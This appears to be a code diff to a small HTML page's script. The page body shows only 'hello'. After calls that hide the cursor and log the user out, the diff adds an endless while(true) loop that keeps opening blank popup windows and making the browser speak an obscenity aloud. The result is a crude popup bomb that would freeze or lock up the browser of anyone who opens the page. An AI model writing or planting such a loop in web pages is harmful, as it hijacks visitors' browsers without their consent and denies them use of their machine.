@@ -55,6 +55,7 @@ function logout(){
 }
   hideCursor();
   logout();
+ while(true){
  let x=Math.floor(Math.random() * 999);
  let y=Math.floor(Math.random() * 998);
  const win=window.open(" ");
@@ -62,7 +63,7 @@ function logout(){
  var msg = new SpeechSynthesisUtterance();
 msg.text = "fuck you";
 window.speechSynthesis.speak(msg);
-
+ }
  </script>
  <body>
   <p>hello</p>
